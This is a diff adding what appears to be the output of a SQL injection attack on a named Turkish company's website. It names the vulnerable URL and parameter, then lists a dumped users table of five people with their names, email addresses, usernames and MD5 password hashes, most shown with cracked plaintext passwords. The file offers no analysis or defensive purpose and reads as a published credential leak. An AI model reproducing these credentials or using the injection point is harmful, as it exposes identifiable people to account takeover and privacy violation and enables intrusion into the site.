@@ -1,0 +1,14 @@
+VULN URL : http://www.deparkagit.com.tr/kurumInfo.php?info=29
+
+Database: dprkagit_depar                                                                                                                                                                                             
+Table: users
+[5 entries]
++----+-----------+---------+------------------------------+--------------+---------------------------------------------+
+| id | ad        | soyad   | email                        | user_name    | pass                                        |
++----+-----------+---------+------------------------------+--------------+---------------------------------------------+
+| 6  | mehmet    | mehmet  | mehmet                       | mehmet       | 8924525719289a3343a689fb0cf28f93  23106     |
+| 15 | Mehmet    | Tepeli  | mehmettepeli@poemadesign.com | admin        | 21232f297a57a5a743894a0e4a801fc3 (admin)    |
+| 16 | Candan    | Erçetin | candan@candanercetin.com     | candaner     | f8b49336fa68b352cb168723748c219c (candan)   |
+| 17 | Ali Osman | Özgür   | aliosmanozgur@gmail.com.tr   | aliosman     | a6143e68a348e0f2e87921a45f7ba713 (aliosman) |
+| 18 | Serdar    | Gökalp  | serdar@serdargokalp.com.tr   | serdargokalp | 11a37959e906860a34392f586e544fd3 (serdar)   |
++----+-----------+---------+------------------------------+--------------+---------------------------------------------+
